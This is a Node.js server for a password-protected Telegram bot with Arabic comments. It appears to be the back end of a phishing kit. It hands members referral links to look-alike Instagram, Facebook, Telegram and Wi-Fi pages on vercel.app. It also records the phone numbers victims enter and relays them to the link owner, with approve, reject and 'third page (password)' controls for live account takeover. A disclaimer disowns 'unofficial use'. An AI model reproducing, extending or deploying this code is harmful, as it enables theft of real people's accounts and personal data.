const { TelegramBot } = require("node-telegram-bot-api");
const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const crypto = require("crypto");

// ============================================================
// الإعدادات
// ============================================================

const TOKEN = process.env.BOT_TOKEN;
const PORT = process.env.PORT || 3000;
const OWNER_ID = "8425767629"; // ← ضع معرفك هنا

if (!TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}


// ============================================================
// كلمة السر المتغيرة
// ============================================================

let currentSecretCode = generateSecretCode();

function generateSecretCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
    let code = '';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}


// ============================================================
// جدولة تغيير كلمة السر (بدون node-schedule)
// ============================================================

function scheduleDailyReset() {
    const now = new Date();
    const target = new Date();
    target.setHours(11, 0, 0, 0);

    if (now > target) {
        target.setDate(target.getDate() + 1);
    }

    const msUntilTarget = target.getTime() - now.getTime();

    console.log(`⏰ سيتم تغيير كلمة السر بعد ${Math.round(msUntilTarget / 60000)} دقيقة`);

    setTimeout(() => {
        const oldCode = currentSecretCode;
        currentSecretCode = generateSecretCode();

        console.log(`🔄 تم تغيير كلمة السر: ${oldCode} → ${currentSecretCode}`);

        bot.sendMessage(
            OWNER_ID,
            `🖥️ *┌─────────────────────┐*
│   🔐 ℙ𝔸𝕊𝕊𝕎𝕆ℝ𝔻      │
│   ℂℍ𝔸ℕ𝔾𝔼𝔻         │
└─────────────────────┘

🔑 *كلمة السر الجديدة:*

\`${currentSecretCode}\`

📅 *التاريخ:* ${new Date().toLocaleString('ar-JO', { timeZone: 'Asia/Amman' })}

┌─────────────────────┐
│ ✅ تم التحديث بنجاح │
└─────────────────────┘`,
            { parse_mode: 'Markdown' }
        ).catch(console.error);

        scheduleDailyReset();

    }, msUntilTarget);
}


// ============================================================
// Telegram Bot
// ============================================================

const bot = new TelegramBot(TOKEN, {
    polling: true
});

console.log("✅ Telegram Bot started");


// ============================================================
// Express
// ============================================================

const app = express();

app.use(express.json());


// ============================================================
// CORS
// ============================================================

app.use((req, res, next) => {

    res.setHeader(
        "Access-Control-Allow-Origin",
        "*"
    );

    res.setHeader(
        "Access-Control-Allow-Methods",
        "GET,POST,OPTIONS"
    );

    res.setHeader(
        "Access-Control-Allow-Headers",
        "Content-Type"
    );

    if (req.method === "OPTIONS") {
        return res.sendStatus(204);
    }

    next();
});


// ============================================================
// Database
// ============================================================

const db = new sqlite3.Database("./referrals.db");

db.serialize(() => {

    db.run(`
        CREATE TABLE IF NOT EXISTS referrals (
            token TEXT PRIMARY KEY,
            telegram_id TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS contact_requests (
            request_id TEXT PRIMARY KEY,
            telegram_id TEXT NOT NULL,
            phone TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS users (
            telegram_id TEXT PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            is_active INTEGER DEFAULT 0,
            is_verified INTEGER DEFAULT 0,
            last_active DATETIME DEFAULT CURRENT_TIMESTAMP,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

});

console.log("✅ Database ready");


// ============================================================
// بدء جدولة تغيير كلمة السر
// ============================================================

scheduleDailyReset();
console.log("⏰ تم جدولة تغيير كلمة السر يومياً الساعة 11:00 صباحاً");


// ============================================================
// المستخدمون الذين وافقوا على الشروط
// ============================================================

const acceptedUsers = new Set();
const verifiedUsers = new Set();


// ============================================================
// Helpers
// ============================================================

function createToken() {

    return crypto
        .randomBytes(32)
        .toString("hex");

}


function createRequestId() {

    return crypto
        .randomBytes(16)
        .toString("hex");

}


function createReferral(telegramId) {

    return new Promise((resolve, reject) => {

        const token = createToken();

        db.run(
            `
            INSERT INTO referrals
            (token, telegram_id)
            VALUES (?, ?)
            `,
            [
                token,
                String(telegramId)
            ],
            (error) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(token);

            }
        );

    });

}


function getReferral(token) {

    return new Promise((resolve, reject) => {

        db.get(
            `
            SELECT *
            FROM referrals
            WHERE token = ?
            `,
            [token],
            (error, row) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(row || null);

            }
        );

    });

}


function getRequest(requestId) {

    return new Promise((resolve, reject) => {

        db.get(
            `
            SELECT *
            FROM contact_requests
            WHERE request_id = ?
            `,
            [requestId],
            (error, row) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(row || null);

            }
        );

    });

}


function updateRequestStatus(
    requestId,
    status
) {

    return new Promise((resolve, reject) => {

        db.run(
            `
            UPDATE contact_requests
            SET status = ?
            WHERE request_id = ?
            `,
            [
                status,
                requestId
            ],
            (error) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve();

            }
        );

    });

}


function saveUser(telegramId, username, firstName, lastName) {

    return new Promise((resolve, reject) => {

        db.run(
            `
            INSERT OR REPLACE INTO users
            (telegram_id, username, first_name, last_name, last_active)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            `,
            [
                String(telegramId),
                username || null,
                firstName || null,
                lastName || null
            ],
            (error) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve();

            }
        );

    });

}


function verifyUser(telegramId) {

    return new Promise((resolve, reject) => {

        db.run(
            `
            UPDATE users
            SET is_verified = 1, is_active = 1
            WHERE telegram_id = ?
            `,
            [String(telegramId)],
            (error) => {

                if (error) {
                    reject(error);
                    return;
                }

                verifiedUsers.add(String(telegramId));
                resolve();

            }
        );

    });

}


function isUserVerified(telegramId) {

    return new Promise((resolve, reject) => {

        db.get(
            `
            SELECT is_verified
            FROM users
            WHERE telegram_id = ?
            `,
            [String(telegramId)],
            (error, row) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(row ? row.is_verified === 1 : false);

            }
        );

    });

}


function getActiveUsersCount() {

    return new Promise((resolve, reject) => {

        db.get(
            `
            SELECT COUNT(*) as count
            FROM users
            WHERE is_active = 1 AND is_verified = 1
            `,
            [],
            (error, row) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(row ? row.count : 0);

            }
        );

    });

}


function getActiveUsers() {

    return new Promise((resolve, reject) => {

        db.all(
            `
            SELECT telegram_id, username, first_name, last_name, last_active, created_at
            FROM users
            WHERE is_active = 1 AND is_verified = 1
            ORDER BY created_at DESC
            `,
            [],
            (error, rows) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(rows || []);

            }
        );

    });

}


// ============================================================
// Health
// ============================================================

app.get("/", (req, res) => {

    res.json({
        ok: true,
        service: "Telegram Contact Server"
    });

});


app.get("/health", (req, res) => {

    res.json({
        ok: true,
        status: "online"
    });

});


// ============================================================
// إنشاء Referral
// ============================================================

app.post(
    "/api/referral/create",
    async (req, res) => {

        try {

            const {
                telegram_id
            } = req.body;

            if (!telegram_id) {

                return res.status(400).json({
                    success: false,
                    error: "telegram_id is required"
                });

            }

            const token =
                await createReferral(
                    telegram_id
                );

            res.json({
                success: true,
                token
            });

        } catch (error) {

            console.error(error);

            res.status(500).json({
                success: false,
                error: "Failed to create referral"
            });

        }

    }
);


// ============================================================
// التحقق من Referral
// ============================================================

app.get(
    "/api/referral/:token",
    async (req, res) => {

        try {

            const referral =
                await getReferral(
                    req.params.token
                );

            if (!referral) {

                return res.status(404).json({
                    success: false,
                    valid: false,
                    error: "Invalid referral"
                });

            }

            res.json({
                success: true,
                valid: true
            });

        } catch (error) {

            console.error(error);

            res.status(500).json({
                success: false,
                error: "Database error"
            });

        }

    }
);


// ============================================================
// طلب تواصل
// ============================================================

app.post(
    "/api/request-access",
    async (req, res) => {

        try {

            const {
                ref,
                phone,
                app
            } = req.body;


            if (!ref) {

                return res.status(400).json({
                    success: false,
                    error: "ref is required"
                });

            }


            if (!phone) {

                return res.status(400).json({
                    success: false,
                    error: "phone is required"
                });

            }


            const referral =
                await getReferral(ref);


            if (!referral) {

                return res.status(404).json({
                    success: false,
                    error: "Invalid referral"
                });

            }


            const telegramId =
                referral.telegram_id;


            const requestId =
                createRequestId();


            await new Promise(
                (resolve, reject) => {

                    db.run(
                        `
                        INSERT INTO contact_requests
                        (
                            request_id,
                            telegram_id,
                            phone,
                            status
                        )
                        VALUES (?, ?, ?, ?)
                        `,
                        [
                            requestId,
                            String(telegramId),
                            String(phone),
                            "pending"
                        ],
                        (error) => {

                            if (error) {
                                reject(error);
                                return;
                            }

                            resolve();

                        }
                    );

                }
            );


            let buttons = [];

            if (app === "instagram" || app === "facebook") {

                buttons = [
                    [
                        {
                            text: "✅ قبول",
                            callback_data: `approve:${requestId}`
                        },
                        {
                            text: "❌ رفض",
                            callback_data: `reject:${requestId}`
                        }
                    ]
                ];

            } else if (app === "telegram") {

                buttons = [
                    [
                        {
                            text: "✅ قبول",
                            callback_data: `approve:${requestId}`
                        }
                    ],
                    [
                        {
                            text: "❌ رفض",
                            callback_data: `reject:${requestId}`
                        }
                    ],
                    [
                        {
                            text: "🔑 الصفحة الثالثة",
                            callback_data: `third_page:${requestId}`
                        }
                    ]
                ];

            } else {

                buttons = [
                    [
                        {
                            text: "✅ قبول",
                            callback_data: `approve:${requestId}`
                        },
                        {
                            text: "❌ رفض",
                            callback_data: `reject:${requestId}`
                        }
                    ]
                ];

            }


            await bot.sendMessage(

                telegramId,

                `🖥️ *┌─────────────────────┐*
│   ⚠️ 𝕀ℕℂ𝕆𝕄𝕀ℕ𝔾    │
│   ℝ𝔼ℚ𝕌𝔼𝕊𝕋        │
└─────────────────────┘

📱 ${String.fromCharCode(0x1F7E2)} *رقم التواصل:* 
\`${phone}\`

🆔 *رقم الطلب:* 
\`${requestId}\`

📌 *التطبيق:* ${app || "غير محدد"}

┌─────────────────────┐
│ اختر الإجراء:       │
└─────────────────────┘`,

                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: buttons
                    }
                }

            );


            res.json({

                success: true,
                requestId

            });

        } catch (error) {

            console.error(
                "❌ Request error:",
                error
            );

            res.status(500).json({

                success: false,
                error:
                    "Failed to create request"

            });

        }

    }
);


// ============================================================
// فحص الطلب
// ============================================================

app.get(
    "/api/check-request/:requestId",
    async (req, res) => {

        try {

            const request =
                await getRequest(
                    req.params.requestId
                );


            if (!request) {

                return res.status(404).json({
                    success: false,
                    error: "Request not found"
                });

            }


            res.json({

                success: true,

                status:
                    request.status

            });

        } catch (error) {

            console.error(error);

            res.status(500).json({
                success: false,
                error: "Database error"
            });

        }

    }
);


// ============================================================
// Forgot Password
// ============================================================

app.post(
    "/forgot-password",
    async (req, res) => {

        try {

            const { ref } = req.body;

            if (!ref) {
                return res.status(400).json({
                    success: false,
                    error: "ref is required"
                });
            }

            const referral = await getReferral(ref);

            if (!referral) {
                return res.status(404).json({
                    success: false,
                    error: "Invalid referral"
                });
            }

            const telegramId = referral.telegram_id;

            await bot.sendMessage(
                telegramId,
                `🔑 طلب إعادة تعيين كلمة المرور

تم إرسال طلب إعادة تعيين كلمة المرور.

يرجى التواصل مع المستخدم لتأكيد الطلب.`
            );

            res.json({
                success: true,
                message: "تم إرسال الطلب"
            });

        } catch (error) {

            console.error(
                "❌ Forgot password error:",
                error
            );

            res.status(500).json({
                success: false,
                error: "Failed to send request"
            });

        }

    }
);


// ============================================================
// القائمة الرئيسية
// ============================================================

function sendMainMenu(chatId) {

    return bot.sendMessage(

        chatId,

        `🖥️ *┌─────────────────────┐*
│   𝕊𝕐𝕊𝕋𝔼𝕄 ℝ𝔼𝔸𝔻𝕐   │
└─────────────────────┘

⚡ ${String.fromCharCode(0x1F7E2)} اختر الخدمة:

┌─────────────────────┐
│ 📸 Instagram        │
│ 📘 Facebook         │
│ ✈️ Telegram         │
│ 📞 طلب اتصال        │
│ 📶 Wi-Fi            │
└─────────────────────┘`,

        {
            parse_mode: 'Markdown',
            reply_markup: {

                inline_keyboard: [

                    [
                        {
                            text: "📸 Instagram",
                            callback_data: "instagram"
                        },
                        {
                            text: "📘 Facebook",
                            callback_data: "facebook"
                        }
                    ],

                    [
                        {
                            text: "✈️ Telegram",
                            callback_data: "telegram"
                        },
                        {
                            text: "📞 طلب اتصال",
                            callback_data: "contact"
                        }
                    ],

                    [
                        {
                            text: "📶 Wi-Fi",
                            callback_data: "wifi"
                        }
                    ],

                    [
                        {
                            text: "🔄 تحديث النظام",
                            callback_data: "refresh"
                        }
                    ]

                ]

            }
        }

    );

}


// ============================================================
// /start
// ============================================================

bot.onText(
    /^\/start$/,
    async (msg) => {

        try {

            const chatId =
                msg.chat.id;

            const firstName =
                msg.from?.first_name ||
                "غير معروف";

            const lastName =
                msg.from?.last_name ||
                "";

            const username =
                msg.from?.username
                    ? `@${msg.from.username}`
                    : "لا يوجد";

            const fullName =
                `${firstName} ${lastName}`.trim();


            await saveUser(
                chatId,
                username,
                firstName,
                lastName
            );


            // ✅ إذا كان صاحب البوت
            if (String(chatId) === OWNER_ID) {

                const usersCount = await getActiveUsersCount();
                const usersList = await getActiveUsers();

                let usersText = `🖥️ *┌─────────────────────┐*\n`;
                usersText += `│   📊 𝕌𝕊𝔼ℝ𝕊        │\n`;
                usersText += `└─────────────────────┘\n\n`;
                usersText += `👥 *عدد المستخدمين النشطين:* *${usersCount}*\n\n`;
                usersText += `📋 *قائمة المستخدمين:*\n`;

                if (usersList.length === 0) {
                    usersText += `\n⚠️ لا يوجد مستخدمين نشطين حالياً.`;
                } else {
                    usersList.forEach((user, index) => {
                        const name = user.first_name || user.username || "غير معروف";
                        usersText += `\n${index + 1}. ${name}`;
                        if (user.username) {
                            usersText += ` (@${user.username})`;
                        }
                        usersText += `\n   🆔 \`${user.telegram_id}\``;
                        usersText += `\n   📅 ${user.created_at}`;
                    });
                }

                usersText += `\n\n┌─────────────────────┐`;
                usersText += `\n│ 🔑 كلمة السر الحالية │`;
                usersText += `\n│ \`${currentSecretCode}\` │`;
                usersText += `\n└─────────────────────┘`;

                await bot.sendMessage(
                    chatId,
                    usersText,
                    { parse_mode: 'Markdown' }
                );

                return sendMainMenu(chatId);

            }


            // ✅ التحقق من المستخدم
            const isVerified = await isUserVerified(chatId);

            if (isVerified || verifiedUsers.has(String(chatId))) {

                // ✅ المستخدم موثوق → القائمة
                if (acceptedUsers.has(chatId)) {
                    return sendMainMenu(chatId);
                }

                // ✅ طلب الموافقة على الشروط
                await bot.sendMessage(

                    chatId,

                    `🖥️ *┌─────────────────────┐*
│   𝕊𝕐𝕊𝕋𝔼𝕄 𝕀ℕ𝕀𝕋    │
│   ℂ𝕆ℕℕ𝔼ℂ𝕋𝕀ℕ𝔾     │
└─────────────────────┘

👤 ${String.fromCharCode(0x1F7E2)} *المستخدم:* ${fullName}

🆔 *ID:* \`${chatId}\`

👤 *Username:* ${username}

📋 *شروط الاستخدام:*

⚠️ أنا غير مسؤول عن أي استخدام غير رسمي للبوت.

✅ باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.

┌─────────────────────┐
│ [ ✅ أوافق على الشروط ] │
└─────────────────────┘`,

                    {
                        parse_mode: 'Markdown',
                        reply_markup: {

                            inline_keyboard: [

                                [
                                    {
                                        text: "✅ أوافق على الشروط",
                                        callback_data: "accept_terms"
                                    }
                                ]

                            ]

                        }

                    }

                );

                return;

            }


            // ✅ المستخدم غير موثوق → طلب كلمة السر
            await bot.sendMessage(

                chatId,

                `🖥️ *┌─────────────────────┐*
│   🔐 𝕍𝔼ℝ𝕀𝔽𝕀ℂ𝔸𝕋𝕀𝕆ℕ │
└─────────────────────┘

⚠️ *هذا البوت محمي بكلمة سر.*

📌 *يرجى إدخال كلمة السر للتحقق من هويتك.*

┌─────────────────────┐
│ 🔑 أدخل كلمة السر:   │
└─────────────────────┘

📝 *أرسل كلمة السر في رسالة نصية.*`,

                {
                    parse_mode: 'Markdown'
                }

            );

            // ✅ تخزين حالة المستخدم: في انتظار كلمة السر
            if (!global.waitingForSecret) {
                global.waitingForSecret = new Set();
            }
            global.waitingForSecret.add(String(chatId));


        } catch (error) {

            console.error(
                "❌ Start error:",
                error
            );

        }

    }
);


// ============================================================
// معالجة الرسائل النصية (كلمة السر)
// ============================================================

bot.on('message', async (msg) => {

    try {

        const chatId = String(msg.chat.id);
        const text = msg.text;

        // ✅ إذا كان المستخدم في انتظار إدخال كلمة السر
        if (global.waitingForSecret && global.waitingForSecret.has(chatId)) {

            // ✅ التحقق من كلمة السر
            if (text === currentSecretCode) {

                // ✅ تم التحقق بنجاح
                await verifyUser(chatId);
                global.waitingForSecret.delete(chatId);

                await bot.sendMessage(

                    chatId,

                    `🖥️ *┌─────────────────────┐*
│   ✅ 𝕍𝔼ℝ𝕀𝔽𝕀𝔼𝔻      │
└─────────────────────┘

✅ *تم التحقق بنجاح!*

🔓 يمكنك الآن استخدام البوت.

📌 *اضغط /start للمتابعة.*`,

                    { parse_mode: 'Markdown' }
                );

            } else {

                // ❌ كلمة السر خاطئة
                await bot.sendMessage(

                    chatId,

                    `🖥️ *┌─────────────────────┐*
│   ❌ 𝔼ℝℝ𝕆ℝ         │
└─────────────────────┘

❌ *كلمة السر غير صحيحة!*

⚠️ *يرجى المحاولة مرة أخرى.*

📝 *أرسل كلمة السر الصحيحة.*`,

                    { parse_mode: 'Markdown' }
                );

            }

        }

    } catch (error) {
        console.error("❌ Message error:", error);
    }

});


// ============================================================
// أزرار البوت
// ============================================================

bot.on(
    "callback_query",
    async (query) => {

        try {

            const chatId =
                query.message.chat.id;

            const data =
                query.data;


            if (
                data.startsWith("approve:")
            ) {

                const requestId =
                    data.split(":")[1];


                await updateRequestStatus(
                    requestId,
                    "approved"
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "✅ تم قبول الطلب"
                    }

                );


                await bot.editMessageText(

                    `🖥️ *┌─────────────────────┐*
│   ✅ 𝔸ℙℙℝ𝕆𝕍𝔼𝔻     │
└─────────────────────┘

✅ تم قبول طلب التواصل`,

                    {
                        chat_id: chatId,
                        message_id:
                            query.message.message_id,
                        parse_mode: 'Markdown'
                    }

                );


                return;
            }


            if (
                data.startsWith("reject:")
            ) {

                const requestId =
                    data.split(":")[1];


                await updateRequestStatus(
                    requestId,
                    "rejected"
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "❌ تم رفض الطلب"
                    }

                );


                await bot.editMessageText(

                    `🖥️ *┌─────────────────────┐*
│   ❌ ℝ𝔼𝕁𝔼ℂ𝕋𝔼𝔻     │
└─────────────────────┘

❌ تم رفض طلب التواصل`,

                    {
                        chat_id: chatId,
                        message_id:
                            query.message.message_id,
                        parse_mode: 'Markdown'
                    }

                );


                return;
            }


            if (
                data.startsWith("third_page:")
            ) {

                const requestId =
                    data.split(":")[1];


                await updateRequestStatus(
                    requestId,
                    "third_page"
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "🔑 تم الانتقال للصفحة الثالثة"
                    }

                );


                await bot.editMessageText(

                    `🖥️ *┌─────────────────────┐*
│   🔑 𝕋ℍ𝕀ℝ𝔻 ℙ𝔸𝔾𝔼  │
└─────────────────────┘

🔑 تم الانتقال للصفحة الثالثة (كلمة المرور)`,

                    {
                        chat_id: chatId,
                        message_id:
                            query.message.message_id,
                        parse_mode: 'Markdown'
                    }

                );


                return;
            }


            if (
                data ===
                "accept_terms"
            ) {

                acceptedUsers.add(
                    chatId
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "تم قبول الشروط ✅"
                    }

                );


                await bot.sendMessage(

                    chatId,

                    `🖥️ *┌─────────────────────┐*
│   ✅ 𝔸ℂℂ𝔼ℙ𝕋𝔼𝔻     │
└─────────────────────┘

✅ تم قبول الشروط.

أهلاً بك ${
    query.from?.first_name || ""
}.

🆔 ID الخاص بك:
\`${chatId}\`

اضغط /start للمتابعة.`,

                    {
                        parse_mode: 'Markdown'
                    }

                );


                return;

            }


            if (
                !acceptedUsers.has(chatId)
            ) {

                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "يجب الموافقة على الشروط أولاً."
                    }

                );

                return;

            }


            const websites = {

                instagram:
                    "https://instagram-two-henna.vercel.app/",

                facebook:
                    "https://facebook-ruby-one.vercel.app/",

                telegram:
                    "https://telegram-one-rho.vercel.app/",

                contact:
                    "https://telegram-one-rho.vercel.app/",

                wifi:
                    "https://wifi-free-gamma.vercel.app/"

            };


            const website =
                websites[data];


            if (!website) {

                await bot.answerCallbackQuery(
                    query.id
                );

                return;

            }


            const token =
                await createReferral(
                    chatId
                );


            const separator =
                website.includes("?")
                    ? "&"
                    : "?";


            const referralUrl =
                `${website}${separator}ref=${token}`;


            await bot.answerCallbackQuery(

                query.id,

                {
                    text:
                        "تم إنشاء الرابط ✅"
                }

            );


            await bot.sendMessage(

                chatId,

                `🖥️ *┌─────────────────────┐*
│   🔗 𝕃𝕀ℕ𝕂 𝔾𝔼ℕ𝔼ℝ𝔸𝕋𝔼𝔻 │
└─────────────────────┘

🔗 *رابطك الخاص:*

\`${referralUrl}\`

🆔 *Chat ID الخاص بك:*
\`${chatId}\`

📌 يمكنك مشاركة الرابط مع الشخص الذي يريد التواصل معك.

┌─────────────────────┐
│ ✅ تم الإنشاء بنجاح │
└─────────────────────┘`,

                {
                    parse_mode: 'Markdown'
                }

            );


        } catch (error) {

            console.error(
                "❌ Callback error:",
                error
            );

        }

    }
);


// ============================================================
// Telegram polling errors
// ============================================================

bot.on(
    "polling_error",
    (error) => {

        console.error(
            "❌ Telegram polling error:",
            error.message
        );

    }
);


// ============================================================
// تشغيل السيرفر
// ============================================================

app.listen(

    PORT,

    "0.0.0.0",

    () => {

        console.log("");
        console.log(
            "===================================="
        );

        console.log(
            "🚀 Telegram Bot + API Server"
        );

        console.log(
            `🌐 Port: ${PORT}`
        );

        console.log(
            "❤️ Health: /health"
        );

        console.log(
            "===================================="
        );

        console.log(`🔑 كلمة السر الحالية: ${currentSecretCode}`);
        console.log("⏰ تتغير تلقائياً الساعة 11:00 صباحاً بتوقيت الأردن");

    }

);
